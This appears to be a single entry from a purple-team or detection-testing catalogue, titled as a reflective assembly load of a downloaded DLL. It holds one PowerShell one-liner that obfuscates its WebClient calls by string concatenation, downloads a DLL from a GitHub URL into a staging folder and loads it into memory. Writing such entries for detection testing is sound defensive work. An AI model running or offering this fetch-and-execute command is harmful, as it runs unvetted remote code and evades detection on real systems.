# Source ID #25 — Reflective Assembly Load (downloaded DLL)
powershell.exe -c "(New-Object ('Net.'+'Web'+'Client')).('Download'+'File').Invoke('https://raw.githubusercontent.com/piotrekmarcelpiotrekmarcel/test-files/main/files/mod.dll','C:\purpletest\stage\mod.dll'); [Reflection.Assembly]::LoadFile('C:\purpletest\stage\mod.dll')"
